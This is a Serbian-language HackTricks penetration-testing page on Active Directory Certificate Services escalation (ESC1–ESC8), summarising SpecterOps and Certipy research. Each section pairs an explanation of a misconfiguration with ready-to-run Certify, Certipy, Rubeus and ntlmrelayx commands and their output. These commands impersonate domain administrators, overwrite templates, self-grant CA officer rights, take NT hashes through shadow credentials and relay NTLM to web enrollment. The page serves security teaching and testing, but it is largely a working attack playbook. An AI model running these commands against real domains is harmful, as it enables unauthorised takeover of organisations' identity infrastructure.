# AD CS Eskalacija domena

{{#include ../../../banners/hacktricks-training.md}}


**Ovo je sažetak odeljaka o tehnikama eskalacije iz postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani Certificate Templates - ESC1

### Objašnjenje

### Objašnjenje pogrešno konfigurisanih Certificate Templates - ESC1

- **Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.**
- **Odobrenje menadžera nije potrebno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Security descriptors na Certificate Templates su previše permisivni, što korisnicima sa niskim privilegijama omogućava da dobiju prava za upis.**
- **Certificate Templates su konfigurisani tako da definišu EKU-ove koji olakšavaju autentifikaciju:**
- Uključeni su identifikatori Extended Key Usage (EKU), kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) ili bez EKU-a (SubCA).
- **Template omogućava podnosiocima zahteva da uključe subjectAltName u Certificate Signing Request (CSR):**
- Active Directory (AD) daje prednost subjectAltName-u (SAN) u certificate-u prilikom verifikacije identiteta, ako je prisutan. To znači da se navođenjem SAN-a u CSR-u može zatražiti certificate za impersonaciju bilo kog korisnika (npr. administratora domena). Da li requester može da navede SAN određuje se u AD objektu certificate template-a kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo flag-a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućava requester-u da navede SAN.

> [!CAUTION]
> Ova konfiguracija omogućava korisnicima sa niskim privilegijama da zahtevaju certificate-ove sa proizvoljnim SAN-om, čime se omogućava autentifikacija kao bilo koji principal domena putem Kerberos-a ili SChannel-a.

Ova funkcija je ponekad omogućena radi podrške generisanju HTTPS ili host certificate-ova u hodu od strane proizvoda ili deployment servisa, ili zbog nedovoljnog razumevanja.

Napominje se da kreiranje certificate-a sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći certificate template (kao što je template `WebServer`, u kojem je omogućen `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) duplicira i zatim izmeni tako da uključuje authentication OID.<sup>[[6]](#references)</sup>

### Zloupotreba

Da biste **pronašli ranjive certificate template-e**, možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se ova ranjivost zloupotrebila za lažno predstavljanje kao administrator, može se pokrenuti:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete transformisati generisani **certificate u `.pfx`** format i ponovo ga koristiti za **authenticate koristeći Rubeus ili certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi „Certreq.exe“ i „Certutil.exe“ mogu se koristiti za generisanje PFX-a: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija predložaka sertifikata unutar konfiguracione šeme AD Forest-a, konkretno onih koji ne zahtevaju odobrenje ili potpise, poseduju EKU za Client Authentication ili Smart Card Logon i imaju omogućenu zastavicu `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, može se izvršiti pokretanjem sledećeg LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Pogrešno konfigurisani šabloni sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe predstavlja varijaciju prvog:

1. Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Zahtev za autorizovanim potpisima je izostavljen.
4. Previše permisivan security descriptor na šablonu sertifikata dodeljuje korisnicima sa niskim privilegijama prava za upis sertifikata.
5. **Šablon sertifikata je definisan tako da uključuje Any Purpose EKU ili nema EKU.**

**Any Purpose EKU** omogućava attackeru da dobije sertifikat za **bilo koju namenu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda itd. Ista **tehnika korišćena za ESC3** može se primeniti za iskorišćavanje ovog scenarija.

Sertifikati **bez EKU-ova**, koji se ponašaju kao sertifikati podređenog CA-a, mogu se iskoristiti za **bilo koju namenu** i **takođe koristiti za potpisivanje novih sertifikata**. Zbog toga attacker može navesti proizvoljne EKU-ove ili polja u novim sertifikatima korišćenjem sertifikata podređenog CA-a.

Međutim, novi sertifikati kreirani za **autentifikaciju domena** neće funkcionisati ako podređeni CA nije pouzdan u objektu **`NTAuthCertificates`**, što je podrazumevana postavka. Ipak, attacker i dalje može da kreira **nove sertifikate sa bilo kojim EKU-om** i proizvoljnim vrednostima sertifikata. Oni bi potencijalno mogli biti **zloupotrebljeni** za širok opseg namena (npr. potpisivanje koda, autentifikacija servera itd.) i mogli bi imati značajne posledice po druge aplikacije u mreži, kao što su SAML, AD FS ili IPSec.<sup>[[6]](#references)</sup>

Za enumeraciju šablona koji odgovaraju ovom scenariju u okviru konfiguracione šeme AD Forest-a, može se pokrenuti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Pogrešno konfigurisani Enrollment Agent template-i - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugačiji EKU** (Certificate Request Agent) i **2 različita template-a** (zbog toga ima 2 skupa zahteva),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Enrollment Agent** u Microsoft dokumentaciji, omogućava principal-u da **enroll-uje** **certificate** u ime drugog user-a.

**„Enrollment agent“** se **enroll-uje** u takav **template** i koristi dobijeni **certificate da potpiše CSR zajedno sa drugim user-om**. Zatim **šalje** **CSR sa oba potpisa** CA-u, enroll-ujući se u **template** koji **dozvoljava „enroll on behalf of“**, a CA odgovara **certificate-om koji pripada „drugom“ user-u**.<sup>[[6]](#references)</sup>

**Zahtevi 1:**

- Enterprise CA dodeljuje prava za enrollment user-ima sa niskim privilegijama.
- Zahtev za odobrenje manager-a je izostavljen.
- Ne postoji zahtev za autorizovanim potpisima.
- Security descriptor certificate template-a je previše permisivan i dodeljuje prava za enrollment user-ima sa niskim privilegijama.
- Certificate template uključuje Certificate Request Agent EKU, što omogućava zahtev za drugim certificate template-ima u ime drugih principal-a.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za enrollment user-ima sa niskim privilegijama.
- Odobrenje manager-a je zaobiđeno.
- Verzija schema-e template-a je ili 1 ili veća od 2 i navodi Application Policy Issuance Requirement koji zahteva Certificate Request Agent EKU.
- EKU definisan u certificate template-u dozvoljava domain authentication.
- Ograničenja za enrollment agent-e nisu primenjena na CA-u.

### Abuse

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) za abuse ovog scenarija:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**users** kojima je dozvoljeno da **obtain** **enrollment agent certificate**, templates u kojima je enrollment **agents** dozvoljeno da izvrše enrollment i **accounts** u čije ime enrollment agent može da postupa mogu biti ograničeni enterprise CA-ovima. Ovo se postiže otvaranjem `certsrc.msc` **snap-in** dodatka, **desnim klikom na CA**, **klikom na Properties**, a zatim **navigacijom** do kartice „Enrollment Agents“.

Međutim, napominje se da je **default** podešavanje za CA-ove „**Do not restrict enrollment agents**“. Kada administratori omoguće ograničenje enrollment agenata tako što ga podese na „Restrict enrollment agents“, podrazumevana konfiguracija i dalje ostaje izuzetno permisivna. Ona omogućava **Everyone** pristup enrollment-u u svim templates kao bilo koji korisnik.

## Kontrola pristupa ranjivom Certificate Template-u - ESC4

### **Objašnjenje**

**security descriptor** na **certificate templates** definiše **permissions** koje određeni **AD principals** imaju u vezi sa template-om.

Ako **attacker** poseduje potrebne **permissions** za **izmenu** **template-a** i **uvođenje** bilo kojih **exploitable misconfigurations** opisanih u **prethodnim odeljcima**, može se omogućiti privilege escalation.

Značajne permissions koje se primenjuju na certificate templates uključuju:<sup>[[6]](#references)</sup>

- **Owner:** Dodeljuje implicitnu kontrolu nad objektom, omogućavajući izmenu bilo kojih atributa.
- **FullControl:** Omogućava potpunu kontrolu nad objektom, uključujući mogućnost izmene bilo kojih atributa.
- **WriteOwner:** Omogućava promenu vlasnika objekta u principal-a pod kontrolom attackera.
- **WriteDacl:** Omogućava izmenu kontrola pristupa, čime se potencijalno attacker-u može dodeliti FullControl.
- **WriteProperty:** Omogućava izmenu bilo kojih svojstava objekta.

### Abuse

Da biste identifikovali principals sa pravima izmene na templates i drugim PKI objektima, izvršite enumeration pomoću Certify-ja:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Primer privesc-a poput prethodnog:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 se javlja kada korisnik ima privilegije upisa nad certificate template-om. Ovo se, na primer, može zloupotrebiti za prepisivanje konfiguracije certificate template-a kako bi template postao ranjiv na ESC1.

Kao što možemo videti na gornjoj putanji, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` edge vezu ka `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Evo kratkog pregleda Certipy-jeve `shadow auto` komande za preuzimanje NT hash-a žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može da prepiše konfiguraciju certificate template-a jednom komandom. **Podrazumevano**, Certipy će **prepisati** konfiguraciju tako da postane **ranjiva na ESC1**. Takođe možemo navesti **`-save-old` parametar kako bismo sačuvali staru konfiguraciju**, što će biti korisno za **vraćanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola pristupa ranjivim PKI objektima - ESC5

### Objašnjenje

Široka mreža međusobno povezanih odnosa zasnovanih na ACL-ovima, koja obuhvata nekoliko objekata pored certificate templates i certificate authority, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD computer objekat CA servera, koji može biti kompromitovan mehanizmima kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji descendant AD objekat ili container unutar određene putanje containera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja obuhvata, između ostalog, containere i objekte kao što su Certificate Templates container, Certification Authorities container, NTAuthCertificates objekat i Enrollment Services Container.

Bezbednost PKI sistema može biti ugrožena ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojom od ovih kritičnih komponenti.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema obrađena u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se bavi implikacijama **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag-a, kako ih je opisao Microsoft. Ova konfiguracija, kada je aktivirana na Certification Authority (CA), omogućava uključivanje **vrednosti koje definiše korisnik** u **subject alternative name** za **bilo koji zahtev**, uključujući zahteve konstruisane iz Active Directory®. Shodno tome, ova mogućnost omogućava **napadaču** da se upiše putem **bilo kog template-a** podešenog za domain **authentication**—konkretno, onih koji omogućavaju upis **neprivilegovanim** korisnicima, kao što je standardni User template. Kao rezultat toga, moguće je dobiti certificate koji napadaču omogućava autentifikaciju kao domain administrator ili **bilo koji drugi aktivni entitet** unutar domena.<sup>[[9]](#references)</sup>

**Napomena**: Pristup dodavanja **alternative names** u Certificate Signing Request (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (poznatog kao “Name Value Pairs”), razlikuje se od strategije eksploatacije SAN-ova u ESC1. Razlika je u tome **kako su informacije o nalogu enkapsulirane**—unutar certificate atributa, a ne ekstenzije.

### Abuse

Da bi proverile da li je podešavanje aktivirano, organizacije mogu da koriste sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija u suštini koristi **udaljeni pristup registru**, stoga bi alternativni pristup mogao biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati kao što su [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) mogu da otkriju ovu pogrešnu konfiguraciju i da je iskoriste:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Za izmenu ovih postavki, pod pretpostavkom da posedujete **domain administrative** prava ili ekvivalentna prava, sledeća komanda može se izvršiti sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u svom okruženju, zastavica se može ukloniti pomoću:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novoizdati **sertifikati** sadržavaće **bezbednosnu ekstenziju** koja uključuje svojstvo **`objectSid` podnosioca zahteva**. Kod ESC1, ovaj SID se izvodi iz navedenog SAN-a. Međutim, kod **ESC6**, SID odražava **`objectSid` podnosioca zahteva**, a ne SAN.\
> Za eksploataciju ESC6 neophodno je da sistem bude podložan na ESC10 (slaba mapiranja sertifikata), koji daje prednost **SAN-u u odnosu na novu bezbednosnu ekstenziju**.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Kontrola pristupa sertifikacionom autoritetu održava se putem skupa dozvola koje regulišu radnje CA-a. Ove dozvole mogu se pregledati pristupom aplikaciji `certsrv.msc`, desnim klikom na CA, izborom opcije Properties, a zatim otvaranjem kartice Security. Pored toga, dozvole se mogu enumerisati korišćenjem modula PSPKI i komandi kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, odnosno **`ManageCA`** i **`ManageCertificates`**, koja odgovaraju ulogama „CA administrator” i „Certificate Manager”.<sup>[[6]](#references)</sup>

#### Zloupotreba

Posedovanje prava **`ManageCA`** nad certificate authority omogućava principalu da daljinski menja podešavanja koristeći PSPKI. To uključuje uključivanje zastavice **`EDITF_ATTRIBUTESUBJECTALTNAME2`** kako bi se omogućilo navođenje SAN vrednosti u bilo kom template-u, što je ključni aspekt domain escalation-a.

Ovaj proces se može pojednostaviti korišćenjem PSPKI cmdlet-a **Enable-PolicyModuleFlag**, koji omogućava izmene bez direktne interakcije sa GUI-em.

Posedovanje prava **`ManageCertificates`** omogućava odobravanje zahteva na čekanju, čime se efektivno zaobilazi zaštita „CA certificate manager approval”.

Kombinacija **Certify** i **PSPKI** modula može se koristiti za podnošenje zahteva, odobravanje i preuzimanje certificate-a:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** su korišćene dozvole **`Manage CA`** da bi se **omogućila** zastavica **EDITF_ATTRIBUTESUBJECTALTNAME2** i izveo **ESC6 napad**, ali to neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa **`Manage CA`**, takođe mu je dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može daljinski da restartuje servis**. Pored toga, E**SC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Zato je ovde predstavljen drugi napad.

Preduslovi:

- Samo dozvola **`ManageCA`**
- Dozvola **`Manage Certificates`** (može se dodeliti iz **`ManageCA`**)
- Template sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa **`Manage CA`** i **`Manage Certificates`** mogu da **izdaju neuspešne zahteve za sertifikate**. Template sertifikata **`SubCA`** je **ranjiv na ESC1**, ali samo **administratori** mogu da se upišu u template. Prema tome, **korisnik** može da **zatraži** upis u **`SubCA`** — što će biti **odbijeno** — ali će zahtev **naknadno izdati administrator**.<sup>[[6]](#references)</sup>

#### Zloupotreba

Možete sebi **dodeliti pravo pristupa `Manage Certificates`** tako što ćete dodati svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Šablon **`SubCA`** može biti **omogućen na CA-u** pomoću parametra `-enable-template`. Podrazumevano, šablon `SubCA` je omogućen.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi **zahtevanjem sertifikata na osnovu `SubCA` template-a**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim dozvolama **`Manage CA` i `Manage Certificates`**, možemo zatim da **izdamo neuspešan zahtev za sertifikat** pomoću komande `ca` i parametra `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo **preuzeti izdati sertifikat** pomoću komande `req` i parametra `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Napad 3 – Zloupotreba ekstenzije Manage Certificates (SetExtension)

#### Objašnjenje

Pored klasičnih ESC7 zloupotreba (omogućavanje EDITF atributa ili odobravanje zahteva na čekanju), **Certify 2.0** je otkrio potpuno novi primitive koji zahteva samo ulogu *Manage Certificates* (poznatu i kao **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

RPC metod `ICertAdmin::SetExtension` može da izvrši bilo koji principal koji poseduje *Manage Certificates*. Iako su legitimni CA-ovi ovaj metod tradicionalno koristili za ažuriranje ekstenzija na zahtevima **na čekanju**, attacker može da ga zloupotrebi za **dodavanje *non-default* certificate extension** (na primer prilagođenog *Certificate Issuance Policy* OID-a kao što je `1.1.1.1`) zahtevu koji čeka odobrenje.

Pošto ciljani template **ne definiše podrazumevanu vrednost za tu ekstenziju**, CA NEĆE prepisati vrednost pod kontrolom attackera kada zahtev kasnije bude izdat. Dobijeni certificate zato sadrži ekstenziju koju je izabrao attacker, a ona može da:

* Ispuni zahteve Application / Issuance Policy drugih ranjivih template-a (što dovodi do privilege escalation).
* Ubaci dodatne EKU-ove ili policy-je koji certificate-u daju neočekivano poverenje u sistemima trećih strana.

Ukratko, *Manage Certificates* – koji se ranije smatrao „manje moćnom“ polovinom ESC7 – sada može da se iskoristi za potpunu privilege escalation ili dugoročnu persistence, bez menjanja CA konfiguracije i bez potrebe za restriktivnijim pravom *Manage CA*.

#### Zloupotreba primitive-a pomoću Certify 2.0

1. **Pošaljite certificate request koji će ostati *pending*.**  Ovo se može prinudno postići pomoću template-a koji zahteva odobrenje manager-a:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dodajte prilagođenu ekstenziju zahtevu na čekanju** pomoću nove `manage-ca` komande:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Ako template već ne definiše ekstenziju *Certificate Issuance Policies*, gornja vrednost će biti sačuvana nakon izdavanja.*

3. **Izdajte zahtev** (ako vaša uloga takođe ima prava za odobravanje *Manage Certificates*) ili sačekajte da ga operator odobri. Kada bude izdat, preuzmite certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Dobijeni certificate sada sadrži zlonamerni issuance-policy OID i može se koristiti u narednim napadima (npr. ESC13, domain escalation itd.).

> NAPOMENA:  Isti napad može da se izvrši pomoću Certipy ≥ 4.7 kroz komandu `ca` i parametar `-set-extension`.

## NTLM Relay na AD CS HTTP Endpoint-ima – ESC8

### Objašnjenje

> [!TIP]
> U okruženjima u kojima je **AD CS instaliran**, ako postoji **web enrollment endpoint koji je ranjiv** i ako je objavljen najmanje jedan **certificate template** koji dozvoljava **domain computer enrollment i client authentication** (kao što je podrazumevani **`Machine`** template), postaje moguće da **attacker kompromituje bilo koji computer sa aktivnom spooler service**!

AD CS podržava nekoliko **HTTP-based enrollment metoda**, koje su dostupne kroz dodatne server roles koje administratori mogu instalirati. Ovi interfejsi za HTTP-based certificate enrollment podložni su **NTLM relay napadima**. Attacker sa **kompromitovanog machine-a može da se impersonira kao bilo koji AD account koji se autentifikuje putem inbound NTLM-a**. Dok se impersonira kao victim account, attacker može da pristupi ovim web interfejsima i **zatraži client authentication certificate koristeći `User` ili `Machine` certificate template-e**.

- **Web enrollment interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`) podrazumevano koristi samo HTTP, koji ne pruža zaštitu od NTLM relay napada. Pored toga, eksplicitno dozvoljava samo NTLM authentication kroz svoj Authorization HTTP header, zbog čega sigurnije metode authentication-a, kao što je Kerberos, nisu primenljive.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service i **Network Device Enrollment Service** (NDES) podrazumevano podržavaju negotiate authentication kroz svoj Authorization HTTP header. Negotiate authentication **podržava i Kerberos i NTLM**, što attacker-u omogućava da tokom relay napada **spusti authentication na NTLM**. Iako ovi web services podrazumevano omogućavaju HTTPS, sam HTTPS **ne štiti od NTLM relay napada**. Zaštita HTTPS services-a od NTLM relay napada moguća je samo kada se HTTPS kombinuje sa channel binding-om. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je neophodno za channel binding.<sup>[[6]](#references)</sup>

Čest **problem** kod NTLM relay napada jeste **kratko trajanje NTLM sesija** i nemogućnost attackera da komunicira sa services-ima koji **zahtevaju NTLM signing**.

Ipak, ovo ograničenje se prevazilazi iskorišćavanjem NTLM relay napada za dobijanje certificate-a za user-a, pošto period važenja certificate-a određuje trajanje sesije, a certificate može da se koristi sa services-ima koji **zahtevaju NTLM signing**. Uputstva za korišćenje ukradenog certificate-a dostupna su na:


{{#ref}}
account-persistence.md
{{#endref}}

Drugo ograničenje NTLM relay napada jeste to što **victim account mora da se autentifikuje na machine-u pod kontrolom attackera**. Attacker može da čeka ili da pokuša da **iznudi** ovu authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)`-jev `cas` enumeriše **omogućene HTTP AD CS endpoint-e**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koriste enterprise Certificate Authorities (CAs) za skladištenje krajnjih tačaka Certificate Enrollment Service (CES). Ove krajnje tačke mogu se parsirati i izlistati pomoću alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba pomoću Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Zloupotreba uz [Certipy](https://github.com/ly4k/Certipy)

Certipy podrazumevano podnosi zahtev za sertifikat na osnovu template-a `Machine` ili `User`, u zavisnosti od toga da li se naziv naloga koji se relay-uje završava znakom `$`. Navođenje alternativnog template-a može se izvršiti korišćenjem parametra `-template`.

Tehnika kao što je [PetitPotam](https://github.com/ly4k/PetitPotam) zatim može da se upotrebi za prinudu autentifikacije. Kada se radi sa kontrolerima domena, neophodno je navesti `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
